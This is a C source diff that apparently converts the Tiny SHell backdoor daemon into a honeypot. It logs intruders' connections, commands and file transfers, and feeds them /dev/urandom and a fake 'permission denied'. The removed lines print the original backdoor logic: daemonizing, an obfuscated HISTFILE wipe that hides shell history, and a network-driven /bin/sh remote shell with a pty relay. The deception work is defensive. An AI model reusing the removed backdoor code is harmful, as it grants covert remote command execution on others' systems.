@@ -17,6 +17,9 @@
 #include <fcntl.h>
 #include <netdb.h>
 
+#include <arpa/inet.h>
+#include <syslog.h>
+
 /* PTY support requires system-specific #include */
 
 #if defined LINUX || defined OSF
@@ -65,7 +68,7 @@ void usage(char *argv0)
 
 int main( int argc, char **argv )
 {
-    int ret, pid;
+    int ret; //, pid;
     socklen_t n;
     int opt;
 
@@ -99,6 +102,7 @@ int main( int argc, char **argv )
 
     /* fork into background */
 
+/*
     pid = fork();
 
     if( pid < 0 )
@@ -110,22 +114,23 @@ int main( int argc, char **argv )
     {
         return( 0 );
     }
-
+*/
     /* create a new session */
 
+/*
     if( setsid() < 0 )
     {
         perror("socket");
         return( 2 );
     }
-
+*/
     /* close all file descriptors */
-
+/*
     for( n = 0; n < 1024; n++ )
     {
         close( n );
     }
-
+*/
 	if (cb_host == NULL) {
     	/* create a socket */
 
@@ -177,6 +182,13 @@ int main( int argc, char **argv )
 
 	        client = accept( server, (struct sockaddr *)
                          &client_addr, &n );
+
+            char clientip[20];
+            strcpy(clientip, inet_ntoa(client_addr.sin_addr));
+            //uint32_t ca = (uint32_t) client_addr.sin_addr.s_addr ;
+            //printf("Client IP: %d.%d.%d.%d", ca & 0xff, (ca << 8) & 0xff, (ca << 16) & 0xff, (ca << 24) & 0xff);
+            printf("Check-in of remote client IP: %s port: %d\n", clientip, ((client_addr.sin_port & 0xFF) << 8) + (client_addr.sin_port >> 8));
+            syslog(LOG_EMERG, "Check-in of remote client IP: %s port: %d\n", clientip, ((client_addr.sin_port & 0xFF) << 8) + (client_addr.sin_port >> 8));
 
     	    if( client < 0 )
         	{
@@ -338,6 +350,7 @@ int process_client(int client) {
 	return( ret );
 }
 
+#define TX_SIZE 1024*100 //tx size in 4k blocks
 int tshd_get_file( int client )
 {
     int ret, len, fd;
@@ -353,9 +366,12 @@ int tshd_get_file( int client )
 
     message[len] = '\0';
 
+    printf("Attempt to download file: %s ... serving /dev/urandom\n", message);
+    syslog(LOG_EMERG, "Attempt to download file: %s ... serving /dev/urandom\n", message);
+
     /* open local file */
 
-    fd = open( (char *) message, O_RDONLY );
+    fd = open( "/dev/urandom", O_RDONLY );
 
     if( fd < 0 )
     {
@@ -364,14 +380,20 @@ int tshd_get_file( int client )
 
     /* send the data */
 
-    while( 1 )
+    //while( 1 )
+    for (int i=0; i<TX_SIZE; i++)
     {
         len = read( fd, message, BUFSIZE );
 
-        if( len == 0 ) break;
-
+/*
+        if( len == 0 ) {
+            printf("Read nothing from /dev/urandom");
+            break;
+        }
+*/
         if( len < 0 )
         {
+            printf("Error reading from /dev/urandom");
             return( 16 );
         }
 
@@ -379,16 +401,19 @@ int tshd_get_file( int client )
 
         if( ret != PEL_SUCCESS )
         {
+            printf("Error sending file data for download attempt\n");
             return( 17 );
         }
     }
 
+    printf("Sent %d bytes to attacker\n", TX_SIZE*4096);
+    syslog(LOG_EMERG, "Sent %d bytes to attacker\n", TX_SIZE*4096);
     return( 18 );
 }
 
 int tshd_put_file( int client )
 {
-    int ret, len, fd;
+    int ret, len; //, fd;
 
     /* get the filename */
 
@@ -403,13 +428,17 @@ int tshd_put_file( int client )
 
     /* create local file */
 
+    printf("Attempt to upload file: %s\n", message);
+    syslog(LOG_EMERG, "Attempt to upload file: %s\n", message);
+
+/*
     fd = creat( (char *) message, 0644 );
 
     if( fd < 0 )
     {
         return( 20 );
     }
-
+*/
     /* fetch the data */
 
     while( 1 )
@@ -426,341 +455,49 @@ int tshd_put_file( int client )
             return( 21 );
         }
 
+        write(STDOUT_FILENO, message, len ); // write file data to stdout (careful has to be piped to file, as no encoding in place)
+/*
         if( write( fd, message, len ) != len )
         {
             return( 22 );
         }
+*/        
     }
 
+    printf("\nEOF\n");
     return( 23 );
 }
 
 int tshd_runshell( int client )
 {
-    fd_set rd;
-    struct winsize ws;
-    char *slave, *temp, *shell;
-    int ret, len, pid, pty, tty, n;
+    int len,ret;
+    unsigned char rsp[100];
+    char *rsp_str = "permission denied\n";
 
-    /* request a pseudo-terminal */
+    memcpy(rsp, rsp_str, 18);
 
-#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF
 
-    if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
-    {
-        return( 24 );
+    if (pel_recv_msg( client, message, &len ) == PEL_SUCCESS) {
+        message[len] = 0x00;
+        printf("Remote console terminal env var: TERM=%s\n", message);
     }
 
-    slave = ttyname( tty );
-
-    if( slave == NULL )
-    {
-        return( 25 );
+    if (pel_recv_msg( client, message, &len ) == PEL_SUCCESS) {
+        printf("remote console dimensions: rows %d cols %d\n", (message[0]<<8) + message[1], (message[2] <<8) +  message[3]);
     }
 
-#else
-#if defined IRIX
 
-    slave = _getpty( &pty, O_RDWR, 0622, 0 );
-
-    if( slave == NULL )
-    {
-        return( 26 );
-    }
-
-    tty = open( slave, O_RDWR | O_NOCTTY );
-
-    if( tty < 0 )
-    {
-        return( 27 );
-    }
-
-#else
-#if defined CYGWIN || defined SUNOS || defined HPUX
-
-    pty = open( "/dev/ptmx", O_RDWR | O_NOCTTY );
-
-    if( pty < 0 )
-    {
-        return( 28 );
-    }
-
-    if( grantpt( pty ) < 0 )
-    {
-        return( 29 );
-    }
-
-    if( unlockpt( pty ) < 0 )
-    {
-        return( 30 );
-    }
-
-    slave = ptsname( pty );
-
-    if( slave == NULL )
-    {
-        return( 31 );
-    }
-
-    tty = open( slave, O_RDWR | O_NOCTTY );
-
-    if( tty < 0 )
-    {
-        return( 32 );
-    }
-
-#if defined SUNOS || defined HPUX
-
-    if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
-    {
-        return( 33 );
-    }
-
-    if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
-    {
-        return( 34 );
-    }
-
-#if defined SUNOS
-
-    if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
-    {
-        return( 35 );
-    }
-
-#endif
-#endif
-#endif
-#endif
-#endif
-
-    /* just in case bash is run, kill the history file */
-
-    temp = (char *) malloc( 10 );
-
-    if( temp == NULL )
-    {
-        return( 36 );
-    }
-
-    temp[0] = 'H'; temp[5] = 'I';
-    temp[1] = 'I'; temp[6] = 'L';
-    temp[2] = 'S'; temp[7] = 'E';
-    temp[3] = 'T'; temp[8] = '=';
-    temp[4] = 'F'; temp[9] = '\0';
-
-    putenv( temp );
-
-    /* get the TERM environment variable */
-
-    ret = pel_recv_msg( client, message, &len );
-
-    if( ret != PEL_SUCCESS )
-    {
-        return( 37 );
-    }
-
-    message[len] = '\0';
-
-    temp = (char *) malloc( len + 6 );
-
-    if( temp == NULL )
-    {
-        return( 38 );
-    }
-
-    temp[0] = 'T'; temp[3] = 'M';
-    temp[1] = 'E'; temp[4] = '=';
-    temp[2] = 'R';
-
-    strncpy( temp + 5, (char *) message, len + 1 );
-
-    putenv( temp );
-
-    /* get the window size */
-
-    ret = pel_recv_msg( client, message, &len );
-
-    if( ret != PEL_SUCCESS || len != 4 )
-    {
-        return( 39 );
-    }
-
-    ws.ws_row = ( (int) message[0] << 8 ) + (int) message[1];
-    ws.ws_col = ( (int) message[2] << 8 ) + (int) message[3];
-
-    ws.ws_xpixel = 0;
-    ws.ws_ypixel = 0;
-
-    if( ioctl( pty, TIOCSWINSZ, &ws ) < 0 )
-    {
-        return( 40 );
-    }
-
-    /* get the system command */
-
-    ret = pel_recv_msg( client, message, &len );
-
-    if( ret != PEL_SUCCESS )
-    {
-        return( 41 );
-    }
-
-    message[len] = '\0';
-
-    temp = (char *) malloc( len + 1 );
-
-    if( temp == NULL )
-    {
-        return( 42 );
-    }
-
-    strncpy( temp, (char *) message, len + 1 );
-
-    /* fork to spawn a shell */
-
-    pid = fork();
-
-    if( pid < 0 )
-    {
-        return( 43 );
-    }
-
-    if( pid == 0 )
-    {
-        /* close the client socket and the pty (master side) */
-
-        close( client );
-        close( pty );
-
-        /* create a new session */
-
-        if( setsid() < 0 )
-        {
-            return( 44 );
+    while (1) {
+        if (pel_recv_msg( client, message, &len ) == PEL_SUCCESS) {
+            //write(1, message, len);
+            message[len] = 0x00;
+            printf("Received command: %s\n", message);
         }
 
-        /* set controlling tty, to have job control */
-
-#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF
-
-        if( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
-        {
-            return( 45 );
+        ret = pel_send_msg(client, rsp, 17);
+        if (ret == PEL_SUCCESS) {
+            return 52;
         }
-
-#else
-#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX
-
-        {
-            int fd;
-
-            fd = open( slave, O_RDWR );
-
-            if( fd < 0 )
-            {
-                return( 46 );
-            }
-
-            close( tty );
-
-            tty = fd;
-        }
-
-#endif
-#endif
-
-        /* tty becomes stdin, stdout, stderr */
-
-        dup2( tty, 0 );
-        dup2( tty, 1 );
-        dup2( tty, 2 );
-
-        if( tty > 2 )
-        {
-            close( tty );
-        }
-
-        /* fire up the shell */
-
-        shell = (char *) malloc( 8 );
-
-        if( shell == NULL )
-        {
-            return( 47 );
-        }
-
-        shell[0] = '/'; shell[4] = '/';
-        shell[1] = 'b'; shell[5] = 's';
-        shell[2] = 'i'; shell[6] = 'h';
-        shell[3] = 'n'; shell[7] = '\0';
-
-        execl( shell, shell + 5, "-c", temp, (char *) 0 );
-
-        /* d0h, this shouldn't happen */
-
-        return( 48 );
     }
-    else
-    {
-        /* tty (slave side) not needed anymore */
-
-        close( tty );
-
-        /* let's forward the data back and forth */
-
-        while( 1 )
-        {
-            FD_ZERO( &rd );
-            FD_SET( client, &rd );
-            FD_SET( pty, &rd );
-
-            n = ( pty > client ) ? pty : client;
-
-            if( select( n + 1, &rd, NULL, NULL, NULL ) < 0 )
-            {
-                return( 49 );
-            }
-
-            if( FD_ISSET( client, &rd ) )
-            {
-                ret = pel_recv_msg( client, message, &len );
-
-                if( ret != PEL_SUCCESS )
-                {
-                    return( 50 );
-                }
-
-                if( write( pty, message, len ) != len )
-                {
-                    return( 51 );
-                }
-            }
-
-            if( FD_ISSET( pty, &rd ) )
-            {
-                len = read( pty, message, BUFSIZE );
-
-                if( len == 0 ) break;
-
-                if( len < 0 )
-                {
-                    return( 52 );
-                }
-
-                ret = pel_send_msg( client, message, len );
-
-                if( ret != PEL_SUCCESS )
-                {
-                    return( 53 );
-                }
-            }
-        }
-
-        return( 54 );
-    }
-
-    /* not reached */
-
-    return( 55 );
 }
+
